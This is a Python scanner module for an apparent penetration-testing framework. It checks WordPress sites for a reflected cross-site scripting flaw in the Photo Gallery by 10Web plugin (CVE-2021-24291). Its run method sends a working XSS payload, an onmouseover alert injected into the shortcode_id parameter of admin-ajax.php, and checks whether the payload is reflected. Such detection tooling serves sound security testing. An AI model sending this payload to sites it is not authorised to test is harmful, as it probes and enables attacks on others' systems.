#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Photo Gallery by 10Web plugin before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Photo Gallery by 10Web <1.5.69 - Cross-Site Scripting Detection',
        'description': 'WordPress Photo Gallery by 10Web plugin before 1.5.69 contains multiple reflected cross-site scripting vulnerabilities via the gallery_id, tag, album_id and theme_id GET parameters passed to the bwg_frontend_data AJAX action, available to both unauthenticated and authenticated users.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'photo', 'wpscan', 'packetstorm', 'xss', 'wordpress', 'wp-plugin', '10web', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/cfb982b2-8b6d-4345-b3ab-3d2b130b873a',
            'https://packetstormsecurity.com/files/162227/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24291',
        ],
        'cve': 'CVE-2021-24291',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1"%20onmouseover=alert(document.domain)//', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('onmouseover=alert(document.domain)//', 'wp-content/uploads/photo-gallery',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Photo Gallery by 10Web <1.5.69 - Cross-Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1"%20onmouseover=alert(document.domain)//',
            )
            return True
        return False

